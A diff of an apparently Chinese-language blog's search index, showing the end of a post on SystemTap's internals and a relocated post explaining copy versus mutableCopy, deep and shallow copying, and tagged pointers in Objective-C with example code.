+<p>卸载内核模块是stapio通过创建执行卸载操作的staprun进程实行的，所以stapio实际还是只负责通讯。</p>
+<hr>
+<p>最后我们通过下面这张图来回顾一下systemtap的工作流程：</p>
+<p><img src="/images/2020-12-07-Linux-%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95-%E4%B9%8B-SystemTap%EF%BC%88%E5%8E%9F%E7%90%86%E7%AF%87%EF%BC%89/systemtap-how-works.png"></p>
+<p>其中DWARF是指Linux的调试符号表格式。</p>
+<p>有关systemtap的具体安装、使用、如何编写stp脚本等问题，请见我的下一篇文章<a href="">Linux 动态调试之 SystemTap（使用篇</a>）。</p>
+<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p>[1] systemtap 探秘（一）- 基本介绍　<a href="https://segmentfault.com/a/1190000019566831">https://segmentfault.com/a/1190000019566831</a>  </p>
+<p>[2] systemtap原理及使用　<a href="https://www.bbsmax.com/A/A7zgmEOP54/">https://www.bbsmax.com/A/A7zgmEOP54/</a>  </p>
+<p>[3] SystemTap Kprobe原理　<a href="https://lzz5235.github.io/2013/12/18/systemtap-kprobe.html">https://lzz5235.github.io/2013/12/18/systemtap-kprobe.html</a>  </p>
+<p>[4] 3.1 Systemp 简介　<a href="https://hotttao.github.io/2020/01/08/linux_perf/11_stap%E7%AE%80%E4%BB%8B/">https://hotttao.github.io/2020/01/08/linux_perf/11_stap%E7%AE%80%E4%BB%8B/</a></p>
+<p>[5] kprobe原理解析（二）　<a href="https://www.cnblogs.com/honpey/p/4575902.html">https://www.cnblogs.com/honpey/p/4575902.html</a></p>
+]]></content>
+      <categories>
+        <category>一些Tools</category>
       </categories>
   </entry>
   <entry>
@@ -740,98 +912,6 @@
 ]]></content>
       <categories>
         <category>翻译</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>copy 与 mutableCopy（传说中的深浅拷贝）</title>
-    <url>/accb5a79.html</url>
-    <content><![CDATA[<h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><p>对象拷贝有两种方式：浅拷贝和深拷贝。</p>
-<p>浅拷贝(shallow copy)，并不拷贝对象本身，<strong>仅仅是拷贝指向对象的指针</strong>。<br>如果 <code>B = [A 浅拷贝]</code>，则 A、B 两个对象中都保存的同一个指针，如果 A 通过这个指针改变了指针指向的对象，那么 B 指针指向的对象也就随之改变了；</p>
-<p>深拷贝是直接<strong>拷贝整个对象到另一块内存中</strong>，开辟新的地址来存储，两个对象至此一别，再无关联。</p>
-<a id="more"></a>
-
-<blockquote>
-<p>对于集合对象（如 NSSArray、NSDictionary 等）而言，又有<strong>单层深拷贝</strong>与<strong>完全拷贝</strong>之分。</p>
-<p>单层深拷贝(one-level-deep copy)：指的是对于被拷贝对象，至少有一层是深拷贝。<br>完全拷贝(real-deep copy)：指的是对于被拷贝对象的每一层都是对象拷贝。</p>
-</blockquote>
-<h2 id="copy-与-mutableCopy"><a href="#copy-与-mutableCopy" class="headerlink" title="copy 与 mutableCopy"></a>copy 与 mutableCopy</h2><p>不管是集合类对象，还是非集合类对象，接收到 copy 和 mutableCopy 消息时，都遵循以下准则：</p>
-<ul>
-<li>copy 返回不可变(imutable)对象，如果对copy返回值使用可变对象方法就会crash；</li>
-<li>mutablCopy 默认返回可变(mutable)对象（如果拷贝后的对象本身是不可变的，那也没法变呀，总不能改变人对象的类型吧，比如 <code>NSString *str2 = [str1 mutableCopy];</code> ）。</li>
-</ul>
-<h2 id="示例头文件"><a href="#示例头文件" class="headerlink" title="示例头文件"></a>示例头文件</h2><p>首先定义了一系列会用到的属性，另外，我在宏定义里去掉了 NSLog 的时间戳，然后定义了 AmyLog ，用来显示对象的所属类，以及地址。</p>
-<table><tbody><tr><td class="code"><pre><div class="line"><span class="meta">#import <span class="meta-string">&lt;Foundation/Foundation.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="meta">#define NSLog(FORMAT, ...) fprintf(stderr, <span class="meta-string">"%s\n"</span>, [[NSString stringWithFormat:FORMAT, ##__VA_ARGS__] UTF8String] )</span></div><div class="line"></div><div class="line"><span class="meta">#define AmyLog(_var) NSLog(@<span class="meta-string">"     (%@ *) %p\n"</span>, [_var class], _var)</span></div><div class="line"></div><div class="line"><span class="class"><span class="keyword">@interface</span> <span class="title">FirstClass</span> : <span class="title">NSObject</span></span></div><div class="line"></div><div class="line"><span class="comment">//非集合类对象</span></div><div class="line"><span class="keyword">@property</span> (<span class="keyword">nonatomic</span>, <span class="keyword">copy</span>) <span class="built_in">NSString</span> *string;</div><div class="line"><span class="keyword">@property</span> (<span class="keyword">nonatomic</span>, <span class="keyword">strong</span>) <span class="built_in">NSMutableString</span> *mString;</div><div class="line"></div><div class="line"><span class="keyword">@property</span> (<span class="keyword">nonatomic</span>, <span class="keyword">copy</span>) <span class="built_in">NSString</span> *stringCopy;</div><div class="line"><span class="keyword">@property</span> (<span class="keyword">nonatomic</span>, <span class="keyword">copy</span>) <span class="built_in">NSString</span> *stringMutableCopy;</div><div class="line"></div><div class="line"><span class="keyword">@property</span> (<span class="keyword">nonatomic</span>, <span class="keyword">strong</span>) <span class="built_in">NSMutableString</span> *mStringCopy;</div><div class="line"><span class="keyword">@property</span> (<span class="keyword">nonatomic</span>, <span class="keyword">strong</span>) <span class="built_in">NSMutableString</span> *mStringMutableCopy;</div><div class="line"></div><div class="line"><span class="comment">//集合类对象</span></div><div class="line"><span class="keyword">@property</span> (<span class="keyword">nonatomic</span>, <span class="keyword">copy</span>) <span class="built_in">NSArray</span> *array;</div><div class="line"><span class="keyword">@property</span> (<span class="keyword">nonatomic</span>, <span class="keyword">copy</span>) <span class="built_in">NSArray</span> *arrayCopy;</div><div class="line"><span class="keyword">@property</span> (<span class="keyword">nonatomic</span>, <span class="keyword">copy</span>) <span class="built_in">NSArray</span> *arrayMutableCopy;</div><div class="line"></div><div class="line"><span class="keyword">@property</span> (<span class="keyword">nonatomic</span>, <span class="keyword">strong</span>) <span class="built_in">NSMutableArray</span> *mArrayCopy;</div><div class="line"><span class="keyword">@property</span> (<span class="keyword">nonatomic</span>, <span class="keyword">strong</span>) <span class="built_in">NSMutableArray</span> *mArrayMutableCopy;</div><div class="line"></div><div class="line"><span class="keyword">@end</span></div></pre></td></tr></tbody></table>
-
-<h2 id="非集合类对象-NSString"><a href="#非集合类对象-NSString" class="headerlink" title="非集合类对象(NSString)"></a>非集合类对象(NSString)</h2><h3 id="执行代码："><a href="#执行代码：" class="headerlink" title="执行代码："></a>执行代码：</h3><table><tbody><tr><td class="code"><pre><div class="line">FirstClass *fC = [[FirstClass alloc] init];</div><div class="line">        </div><div class="line">fC.string = <span class="string">@"originString"</span>;</div><div class="line">fC.stringCopy = fC.string;  <span class="comment">//浅，指针 (不可变String）</span></div><div class="line">fC.stringMutableCopy = [fC.string mutableCopy];  <span class="comment">//深，新地址 (可变String)</span></div><div class="line">        </div><div class="line">fC.mStringCopy = [fC.string <span class="keyword">copy</span>];  <span class="comment">//浅，指针 (不可变String）</span></div><div class="line">fC.mStringMutableCopy = [fC.string mutableCopy];  <span class="comment">//深，新地址 (可变String)</span></div><div class="line">        </div><div class="line"><span class="built_in">NSLog</span>(<span class="string">@"\n非集合类对象(NSString)：\noriginal address:    "</span>); AmyLog(fC.string);</div><div class="line"><span class="built_in">NSLog</span>(<span class="string">@"copy -&gt; NSString:    "</span>); AmyLog(fC.stringCopy);</div><div class="line"><span class="built_in">NSLog</span>(<span class="string">@"mutableCopy -&gt; NSString:    "</span>); AmyLog(fC.stringMutableCopy);</div><div class="line"><span class="built_in">NSLog</span>(<span class="string">@"copy -&gt; NSMutableString:   "</span>); AmyLog(fC.mStringCopy);</div><div class="line"><span class="built_in">NSLog</span>(<span class="string">@"mutableCopy -&gt; NSMutableString:    "</span>); AmyLog(fC.mStringMutableCopy);</div></pre></td></tr></tbody></table>
-
-<h3 id="打印结果："><a href="#打印结果：" class="headerlink" title="打印结果："></a>打印结果：</h3><p><img src="/images/2016-10-20-%E8%AF%AD%E6%B3%95-copy-%E4%B8%8E-mutableCopy%EF%BC%88%E4%BC%A0%E8%AF%B4%E4%B8%AD%E7%9A%84%E6%B7%B1%E6%B5%85%E6%8B%B7%E8%B4%9D%EF%BC%89/NSString.png"></p>
-<h3 id="NSCFConstantString-和-NSCFString"><a href="#NSCFConstantString-和-NSCFString" class="headerlink" title="__NSCFConstantString 和 __NSCFString"></a>__NSCFConstantString 和 __NSCFString</h3><p><strong>__NSCFConstantString</strong></p>
-<blockquote>
-<p>__NSCFConstantString 对象，就是<strong>字符串常量对象，存储在栈上</strong>，创建之后由系统来管理内存释放.相同内容的 NSCFConstantString 对象地址相同。该对象引用计数很大，为固定值不会变化，表示无限运行的 retainCount ，对其进行 retain 或 release 也不会影响其引用计数。</p>
-<p>当创建一个 NSCFConstantString 对象时，会检测这个字符串内容是否已经存在，如果存在，则直接将地址赋值给变量；不存在的话，则创建新地址，再赋值。</p>
-<p>总的来说，<strong>对于 NSCFConstantString 对象，只要字符串内容不变，就不会分配新的内存地址</strong>，无论你是赋值、 retain、 copy 。这种优化在大量使用 NSString 的情况下可以节省内存，提高性能。</p>
-<p>——摘自简书作者路子：<a href="http://www.jianshu.com/p/0e98f37114e3">NSString：内存简述，Copy与Strong关键字</a></p>
-</blockquote>
-<p>对于 NSString 来说，以下几种赋值方法将会保存为 NSCFConstantString 对象：</p>
-<ol>
-<li>直接赋值，如 <code>NSString *str = @&quot;STR&quot;;</code></li>
-<li>stringWithString ,如 <code>NSString *str = [NSString stringWithString:@&quot;Str&quot;];</code></li>
-<li><code>str1 = str2;</code></li>
-<li><code>str1 = [str2 copy/retain];</code></li>
-</ol>
-<p><strong>__NSCFString</strong></p>
-<p>__NSCFString 对象是 <strong>NSString 的一种子类，存储在堆上</strong>，不属于字符串常量对象。该对象创建之后和其他的 Obj 对象一样引用计数为1，对其执行 retain 和 release 将改变其 retainCount 。</p>
-<p>诸如 <code>[NSString stringWithFormat:]</code> 方法以及 <code>NSMutableString</code> 创建的字符串等，都是构造的这种对象。</p>
-<h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p><code>mutableCopy</code> 意味着你告诉编译器，我拷贝过来的这个对象可能会改变，因此编译器肯定会新开辟一个地址给你。 因此采用这种方式的都是深拷贝（包括单层深拷贝和完全拷贝）。<br>通过结果我们也可以看见，正如我们前面所提到的，copy 返回不可变对象，因此对于原始对象是不可变的 NSSring 类型，完全没有必要再新分配一块内存。<strong>因此对于不可变的非集合对象，采用 mutableCopy 方式的拷贝就是深拷贝，copy 是浅拷贝。</strong></p>
-<h2 id="非集合类对象-NSMutableString"><a href="#非集合类对象-NSMutableString" class="headerlink" title="非集合类对象(NSMutableString)"></a>非集合类对象(NSMutableString)</h2><h3 id="执行代码：-1"><a href="#执行代码：-1" class="headerlink" title="执行代码："></a>执行代码：</h3><table><tbody><tr><td class="code"><pre><div class="line">fC.mString = [<span class="built_in">NSMutableString</span> stringWithString:<span class="string">@"mStringingi"</span>];</div><div class="line">fC.stringCopy = fC.mString;  <span class="comment">//深，新地址（可变String）</span></div><div class="line">fC.stringMutableCopy = [fC.mString mutableCopy]; <span class="comment">////深，新地址 (可变String)</span></div><div class="line">        </div><div class="line">fC.mStringCopy = [fC.mString <span class="keyword">copy</span>];  <span class="comment">//深，新地址，可变String）</span></div><div class="line">fC.mStringMutableCopy = [fC.mString mutableCopy]; <span class="comment">//深，新地址，(可变String)</span></div><div class="line">        </div><div class="line"><span class="built_in">NSLog</span>(<span class="string">@"\n非集合类对象(NSMutableString)：\noriginal address:    "</span>); AmyLog(fC.mString);</div><div class="line"><span class="built_in">NSLog</span>(<span class="string">@"copy -&gt; NSString:    "</span>); AmyLog(fC.stringCopy);</div><div class="line"><span class="built_in">NSLog</span>(<span class="string">@"mutableCopy -&gt; NSString:    "</span>); AmyLog(fC.stringMutableCopy);</div><div class="line"><span class="built_in">NSLog</span>(<span class="string">@"copy -&gt; NSMutableString:   "</span>); AmyLog(fC.mStringCopy);</div><div class="line"><span class="built_in">NSLog</span>(<span class="string">@"mutableCopy -&gt; NSMutableString:    "</span>); AmyLog(fC.mStringMutableCopy);</div></pre></td></tr></tbody></table>
-
-<h3 id="打印结果：-1"><a href="#打印结果：-1" class="headerlink" title="打印结果："></a>打印结果：</h3><p><img src="/images/2016-10-20-%E8%AF%AD%E6%B3%95-copy-%E4%B8%8E-mutableCopy%EF%BC%88%E4%BC%A0%E8%AF%B4%E4%B8%AD%E7%9A%84%E6%B7%B1%E6%B5%85%E6%8B%B7%E8%B4%9D%EF%BC%89/NSMutableString.png"></p>
-<h3 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h3><p>我们已经知道只要用 <code>mutableCopy</code> ，对于非集合对象的拷贝，无论可变不可变，都是深拷贝。 <code>copy</code> 对于不可变对象的拷贝是浅拷贝。那么对于 <code>copy</code> 可变对象呢？如上图的结果所示，是深拷贝。</p>
-<p>也很容易理解，我这个对象是可变的，我随时可能通过其他引用它的指针来改变这个对象，现在你要拷贝一份不可变的内容，编译器当然不能直接把它的指针给你啦，这样岂不就是可变的了？所以要新分配给你一块内存，用来储存你拷贝的不可变内容。</p>
-<p>就是说，<strong>对于可变非集合对象的拷贝，copy 和 mutableCopy 都是做的深拷贝。</strong></p>
-<h3 id="NSTaggedPointerString"><a href="#NSTaggedPointerString" class="headerlink" title="__NSTaggedPointerString"></a>__NSTaggedPointerString</h3><p>Tagged Pointer 是一个能够提升性能、节省内存的有趣的技术。我们知道，程序都使用了指针地址对齐概念。指针地址对齐就是指在分配堆中的内存时往往采用偶数倍或以2为指数倍的内存地址作为地址边界。几乎所有系统架构，包括 Mac OS 和 iOS，都使用了地址对齐概念对象。对于 iOS 和 MAC 来说，指针地址是以16个字节（或16的倍数）为对齐边界的，进一步说，分配的内存地址最后4位永远都是0。</p>
-<p>Tagged Pointer 利用了这一现状，它使对象指针中非零位（最后4位）有了特殊的含义。在苹果的64位 Objective-C 实现中，<strong>若对象指针的最低有效位为1(即奇数)，则该指针为 Tagged Pointer 。这种指针不通过解引用 isa 来获取其所属类，</strong>而是通过接下来三位的一个类表的索引。该索引是用来查找所属类是采用 Tagged Pointer 的哪个类。剩下的60位则留给类来使用。</p>
-<p>Tagged Pointer 有一个简单的应用，那就是 NSNumber 。它使用60位来存储数值。最低位置1。剩下3位为 NSNumber 的标志。这样，就可以存储任何所需内存小于60位的数值。</p>
-<blockquote>
-<p>注：以上是在 x86_64 架构中，<strong>在 iOS ARM64 架构中，是最高4位表示所属类，对于最低位，不同类有不同的意义，比如 NSString 代表的是字符长度 length</strong>，NSNumber 我猜测代表的是数字长度类型。</p>
-</blockquote>
-<p>从外部看，Tagged Pointer很像一个对象。它能够响应消息，因为 objc_msgSend 可以识别 Tagged Pointer 。假设你调用 integerValue ，它将从那60位中提取数值并返回。这样，每访问一个对象，就省下了一次真正对象的内存分配，省下了一次间接取值的时间。同时引用计数可以是空指令，因为没有内存需要释放。对于常用的类，这将是一个巨大的性能提升。</p>
-<p>NSString 也是如此。对于那些所需内存小于60位的字符串，它可以创建一个 Tagged Pointer。所需内存大于60位的则放置在真正的 NSString 对象里。这使得常用的短字符串的性能得到明显的提升。</p>
-<p>关于 NSString 中的 Tagged Pointer 编码比较复杂，条件是<strong>长度小于11位，且由 Apple 的代码生成在运行时</strong>，即不是直接定义，而是如上图中 mutableCopy/copy 转换而来，编码详情请见<a href="http://www.cocoachina.com/ios/20150918/13449.html">【译】采用Tagged Pointer的字符串</a></p>
-<blockquote>
-<p>在 WWDC2013 中 APPLE 对于它的特点是这样总结的：</p>
-<ol>
-<li>Tagged Pointer 专门用来存储小的对象，例如 NSNumber 和NSDate</li>
-<li><strong>Tagged Pointer 指针的值不再是地址了，而是真正的值。所以，实际上它不再是一个对象了，它只是一个披着对象皮的普通变量而已。所以，它的内存并不存储在堆中，也不需要 malloc 和 free 。</strong>跟 __NSCFConstantString 一样拥有非常大的 retainCount ，因为压根儿就不在堆上啊。</li>
-<li>在内存读取上有着3倍的效率，创建时比以前快106倍。</li>
-</ol>
-</blockquote>
-<p>对 NSString 对象来说，当非字面量的数字，英文字母字符串的长度小于等于11的时候会自动成为 NSTaggedPointerString 类型（赋值为常量除外），如果有中文或其他特殊符号（可能是非 ASCII 字符）存在的话则会直接成为 __NSCFString 类型。</p>
-<p><strong>Tagged Pointer 举例</strong><br>比如我们将上面的字符串改为<br><code>fC.mString = [NSMutableString stringWithString:@&quot;mStringingin&quot;];</code>，<br>比之前少了1位，只有11位，则输出结果就变为了：</p>
-<p><img src="/images/2016-10-20-%E8%AF%AD%E6%B3%95-copy-%E4%B8%8E-mutableCopy%EF%BC%88%E4%BC%A0%E8%AF%B4%E4%B8%AD%E7%9A%84%E6%B7%B1%E6%B5%85%E6%8B%B7%E8%B4%9D%EF%BC%89/NSMutableString2.png"></p>
-<p>除了拷贝的可变副本（最后一个），其他不可变副本都是 Tagged Pointer ，直接存储的值。</p>
-<h2 id="集合类对象-NSArray"><a href="#集合类对象-NSArray" class="headerlink" title="集合类对象(NSArray)"></a>集合类对象(NSArray)</h2><h3 id="执行代码：-2"><a href="#执行代码：-2" class="headerlink" title="执行代码："></a>执行代码：</h3><table><tbody><tr><td class="code"><pre><div class="line">fC.array = [<span class="built_in">NSArray</span> arrayWithObjects:<span class="string">@"hello"</span>,<span class="string">@"world"</span>,<span class="string">@"baby"</span>, <span class="literal">nil</span>];</div><div class="line">fC.arrayCopy = fC.array;  <span class="comment">//浅，指针</span></div><div class="line">fC.arrayMutableCopy = [fC.array mutableCopy]; <span class="comment">//单层深，新地址</span></div><div class="line">        </div><div class="line">fC.mArrayCopy = [fC.array <span class="keyword">copy</span>]; <span class="comment">//浅，指针</span></div><div class="line">fC.mArrayMutableCopy = [fC.array mutableCopy]; <span class="comment">//单层深，新地址</span></div><div class="line">        </div><div class="line"><span class="built_in">NSLog</span>(<span class="string">@"\n集合类对象(NSArray)：\noriginal address:    "</span>); AmyLog(fC.array); AmyLog([fC.array objectAtIndex:<span class="number">1</span>]);</div><div class="line">        </div><div class="line"><span class="built_in">NSLog</span>(<span class="string">@"copy -&gt; NSArray:    "</span>); AmyLog(fC.arrayCopy); AmyLog([fC.arrayCopy objectAtIndex:<span class="number">1</span>]);</div><div class="line"><span class="built_in">NSLog</span>(<span class="string">@"mutableCopy -&gt; NSArray:    "</span>); AmyLog(fC.arrayMutableCopy); AmyLog([fC.arrayMutableCopy objectAtIndex:<span class="number">1</span>]);</div><div class="line"></div><div class="line"><span class="built_in">NSLog</span>(<span class="string">@"copy -&gt; NSMutableArray:   "</span>); AmyLog(fC.mArrayCopy); AmyLog([fC.mArrayCopy objectAtIndex:<span class="number">1</span>]);</div><div class="line"><span class="built_in">NSLog</span>(<span class="string">@"mutableCopy -&gt; NSMutableArray:    "</span>); AmyLog(fC.mArrayMutableCopy); AmyLog([fC.mArrayMutableCopy objectAtIndex:<span class="number">1</span>]);</div></pre></td></tr></tbody></table>
-
-<h3 id="打印结果：-2"><a href="#打印结果：-2" class="headerlink" title="打印结果："></a>打印结果：</h3><p><img src="/images/2016-10-20-%E8%AF%AD%E6%B3%95-copy-%E4%B8%8E-mutableCopy%EF%BC%88%E4%BC%A0%E8%AF%B4%E4%B8%AD%E7%9A%84%E6%B7%B1%E6%B5%85%E6%8B%B7%E8%B4%9D%EF%BC%89/NSArray.png"></p>
-<h3 id="分析-2"><a href="#分析-2" class="headerlink" title="分析"></a>分析</h3><p>从结果可以发现，对于第一层的指针来说，跟 NSString 是一样的，copy 浅拷贝（复制指针，即指针不变）， mutableCopy 深拷贝（新内存），但是打印数组中的元素，就发现元素的指针并没有变，也就是第二层依然是浅拷贝，因此这就是单层深拷贝了。</p>
-<h3 id="集合的浅拷贝和完全拷贝"><a href="#集合的浅拷贝和完全拷贝" class="headerlink" title="集合的浅拷贝和完全拷贝"></a>集合的浅拷贝和完全拷贝</h3><p>集合的浅拷贝有非常多种方法（上面那种 copy 就是）。当你进行浅拷贝时，会向原始的集合发送retain消息，引用计数加1，同时指针被拷贝到新的集合。</p>
-<p>现在让我们看一些浅拷贝的例子：</p>
-<table><tbody><tr><td class="code"><pre><div class="line"><span class="built_in">NSArray</span> *shallowCopyArray = [someArray copyWithZone:<span class="literal">nil</span>];   </div><div class="line"><span class="built_in">NSSet</span> *shallowCopySet = [<span class="built_in">NSSet</span> mutableCopyWithZone:<span class="literal">nil</span>];   </div><div class="line"><span class="built_in">NSDictionary</span> *shallowCopyDict = [[<span class="built_in">NSDictionary</span> alloc] initWithDictionary:someDictionary copyItems:<span class="literal">NO</span>];</div></pre></td></tr></tbody></table>
-
-<p>那么如何才能对元素也进行深拷贝呢？</p>
-<p>集合的深拷贝有两种方法。可以用 initWithArray:copyItems: 将第二个参数设置为 YES 即可深拷贝，如</p>
-<table><tbody><tr><td class="code"><pre><div class="line"><span class="built_in">NSDictionary</span> shallowCopyDict = [[<span class="built_in">NSDictionary</span> alloc] initWithDictionary:someDictionary copyItems:<span class="literal">YES</span>];</div></pre></td></tr></tbody></table>
-
-<p>如果你用这种方法深拷贝，集合里的每个对象都会收到 copyWithZone: 消息。如果集合里的对象遵循 NSCopying 协议，那么对象就会被深拷贝到新的集合。如果对象没有遵循 NSCopying 协议，而尝试用这种方法进行深拷贝，会在运行时出错。 copyWithZone: 这种拷贝方式只能够提供一层内存拷贝(one-level-deep copy)，而非真正的深拷贝。</p>
-<p>第二个方法是将集合进行归档(archive)，然后解档(unarchive)，如：</p>
-<table><tbody><tr><td class="code"><pre><div class="line"><span class="built_in">NSArray</span> *trueDeepCopyArray = [<span class="built_in">NSKeyedUnarchiver</span> unarchiveObjectWithData:[<span class="built_in">NSKeyedArchiver</span> archivedDataWithRootObject:oldArray]];</div></pre></td></tr></tbody></table>
-
-<p>终于搞定这个了！</p>
-<hr>
-<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p>[1] NSString：内存简述，Copy与Strong关键字　<a href="http://www.jianshu.com/p/0e98f37114e3">http://www.jianshu.com/p/0e98f37114e3</a><br>[2] iOS 集合的深复制与浅复制　<a href="https://www.zybuluo.com/MicroCai/note/50592">https://www.zybuluo.com/MicroCai/note/50592</a><br>[3] 深入理解Tagged Pointe　<a href="http://www.infoq.com/cn/articles/deep-understanding-of-tagged-pointer/">http://www.infoq.com/cn/articles/deep-understanding-of-tagged-pointer/</a><br>[4] 【译】采用Tagged Pointer的字符串　<a href="http://www.cocoachina.com/ios/20150918/13449.html">http://www.cocoachina.com/ios/20150918/13449.html</a></p>
-]]></content>
-      <categories>
-        <category>编程语言语法</category>
       </categories>
   </entry>
   <entry>
@@ -962,6 +1042,98 @@
 ]]></content>
       <categories>
         <category>逆向知识</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>copy 与 mutableCopy（传说中的深浅拷贝）</title>
+    <url>/accb5a79.html</url>
+    <content><![CDATA[<h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><p>对象拷贝有两种方式：浅拷贝和深拷贝。</p>
+<p>浅拷贝(shallow copy)，并不拷贝对象本身，<strong>仅仅是拷贝指向对象的指针</strong>。<br>如果 <code>B = [A 浅拷贝]</code>，则 A、B 两个对象中都保存的同一个指针，如果 A 通过这个指针改变了指针指向的对象，那么 B 指针指向的对象也就随之改变了；</p>
+<p>深拷贝是直接<strong>拷贝整个对象到另一块内存中</strong>，开辟新的地址来存储，两个对象至此一别，再无关联。</p>
+<a id="more"></a>
+
+<blockquote>
+<p>对于集合对象（如 NSSArray、NSDictionary 等）而言，又有<strong>单层深拷贝</strong>与<strong>完全拷贝</strong>之分。</p>
+<p>单层深拷贝(one-level-deep copy)：指的是对于被拷贝对象，至少有一层是深拷贝。<br>完全拷贝(real-deep copy)：指的是对于被拷贝对象的每一层都是对象拷贝。</p>
+</blockquote>
+<h2 id="copy-与-mutableCopy"><a href="#copy-与-mutableCopy" class="headerlink" title="copy 与 mutableCopy"></a>copy 与 mutableCopy</h2><p>不管是集合类对象，还是非集合类对象，接收到 copy 和 mutableCopy 消息时，都遵循以下准则：</p>
+<ul>
+<li>copy 返回不可变(imutable)对象，如果对copy返回值使用可变对象方法就会crash；</li>
+<li>mutablCopy 默认返回可变(mutable)对象（如果拷贝后的对象本身是不可变的，那也没法变呀，总不能改变人对象的类型吧，比如 <code>NSString *str2 = [str1 mutableCopy];</code> ）。</li>
+</ul>
+<h2 id="示例头文件"><a href="#示例头文件" class="headerlink" title="示例头文件"></a>示例头文件</h2><p>首先定义了一系列会用到的属性，另外，我在宏定义里去掉了 NSLog 的时间戳，然后定义了 AmyLog ，用来显示对象的所属类，以及地址。</p>
+<table><tbody><tr><td class="code"><pre><div class="line"><span class="meta">#import <span class="meta-string">&lt;Foundation/Foundation.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="meta">#define NSLog(FORMAT, ...) fprintf(stderr, <span class="meta-string">"%s\n"</span>, [[NSString stringWithFormat:FORMAT, ##__VA_ARGS__] UTF8String] )</span></div><div class="line"></div><div class="line"><span class="meta">#define AmyLog(_var) NSLog(@<span class="meta-string">"     (%@ *) %p\n"</span>, [_var class], _var)</span></div><div class="line"></div><div class="line"><span class="class"><span class="keyword">@interface</span> <span class="title">FirstClass</span> : <span class="title">NSObject</span></span></div><div class="line"></div><div class="line"><span class="comment">//非集合类对象</span></div><div class="line"><span class="keyword">@property</span> (<span class="keyword">nonatomic</span>, <span class="keyword">copy</span>) <span class="built_in">NSString</span> *string;</div><div class="line"><span class="keyword">@property</span> (<span class="keyword">nonatomic</span>, <span class="keyword">strong</span>) <span class="built_in">NSMutableString</span> *mString;</div><div class="line"></div><div class="line"><span class="keyword">@property</span> (<span class="keyword">nonatomic</span>, <span class="keyword">copy</span>) <span class="built_in">NSString</span> *stringCopy;</div><div class="line"><span class="keyword">@property</span> (<span class="keyword">nonatomic</span>, <span class="keyword">copy</span>) <span class="built_in">NSString</span> *stringMutableCopy;</div><div class="line"></div><div class="line"><span class="keyword">@property</span> (<span class="keyword">nonatomic</span>, <span class="keyword">strong</span>) <span class="built_in">NSMutableString</span> *mStringCopy;</div><div class="line"><span class="keyword">@property</span> (<span class="keyword">nonatomic</span>, <span class="keyword">strong</span>) <span class="built_in">NSMutableString</span> *mStringMutableCopy;</div><div class="line"></div><div class="line"><span class="comment">//集合类对象</span></div><div class="line"><span class="keyword">@property</span> (<span class="keyword">nonatomic</span>, <span class="keyword">copy</span>) <span class="built_in">NSArray</span> *array;</div><div class="line"><span class="keyword">@property</span> (<span class="keyword">nonatomic</span>, <span class="keyword">copy</span>) <span class="built_in">NSArray</span> *arrayCopy;</div><div class="line"><span class="keyword">@property</span> (<span class="keyword">nonatomic</span>, <span class="keyword">copy</span>) <span class="built_in">NSArray</span> *arrayMutableCopy;</div><div class="line"></div><div class="line"><span class="keyword">@property</span> (<span class="keyword">nonatomic</span>, <span class="keyword">strong</span>) <span class="built_in">NSMutableArray</span> *mArrayCopy;</div><div class="line"><span class="keyword">@property</span> (<span class="keyword">nonatomic</span>, <span class="keyword">strong</span>) <span class="built_in">NSMutableArray</span> *mArrayMutableCopy;</div><div class="line"></div><div class="line"><span class="keyword">@end</span></div></pre></td></tr></tbody></table>
+
+<h2 id="非集合类对象-NSString"><a href="#非集合类对象-NSString" class="headerlink" title="非集合类对象(NSString)"></a>非集合类对象(NSString)</h2><h3 id="执行代码："><a href="#执行代码：" class="headerlink" title="执行代码："></a>执行代码：</h3><table><tbody><tr><td class="code"><pre><div class="line">FirstClass *fC = [[FirstClass alloc] init];</div><div class="line">        </div><div class="line">fC.string = <span class="string">@"originString"</span>;</div><div class="line">fC.stringCopy = fC.string;  <span class="comment">//浅，指针 (不可变String）</span></div><div class="line">fC.stringMutableCopy = [fC.string mutableCopy];  <span class="comment">//深，新地址 (可变String)</span></div><div class="line">        </div><div class="line">fC.mStringCopy = [fC.string <span class="keyword">copy</span>];  <span class="comment">//浅，指针 (不可变String）</span></div><div class="line">fC.mStringMutableCopy = [fC.string mutableCopy];  <span class="comment">//深，新地址 (可变String)</span></div><div class="line">        </div><div class="line"><span class="built_in">NSLog</span>(<span class="string">@"\n非集合类对象(NSString)：\noriginal address:    "</span>); AmyLog(fC.string);</div><div class="line"><span class="built_in">NSLog</span>(<span class="string">@"copy -&gt; NSString:    "</span>); AmyLog(fC.stringCopy);</div><div class="line"><span class="built_in">NSLog</span>(<span class="string">@"mutableCopy -&gt; NSString:    "</span>); AmyLog(fC.stringMutableCopy);</div><div class="line"><span class="built_in">NSLog</span>(<span class="string">@"copy -&gt; NSMutableString:   "</span>); AmyLog(fC.mStringCopy);</div><div class="line"><span class="built_in">NSLog</span>(<span class="string">@"mutableCopy -&gt; NSMutableString:    "</span>); AmyLog(fC.mStringMutableCopy);</div></pre></td></tr></tbody></table>
+
+<h3 id="打印结果："><a href="#打印结果：" class="headerlink" title="打印结果："></a>打印结果：</h3><p><img src="/images/2016-10-20-%E8%AF%AD%E6%B3%95-copy-%E4%B8%8E-mutableCopy%EF%BC%88%E4%BC%A0%E8%AF%B4%E4%B8%AD%E7%9A%84%E6%B7%B1%E6%B5%85%E6%8B%B7%E8%B4%9D%EF%BC%89/NSString.png"></p>
+<h3 id="NSCFConstantString-和-NSCFString"><a href="#NSCFConstantString-和-NSCFString" class="headerlink" title="__NSCFConstantString 和 __NSCFString"></a>__NSCFConstantString 和 __NSCFString</h3><p><strong>__NSCFConstantString</strong></p>
+<blockquote>
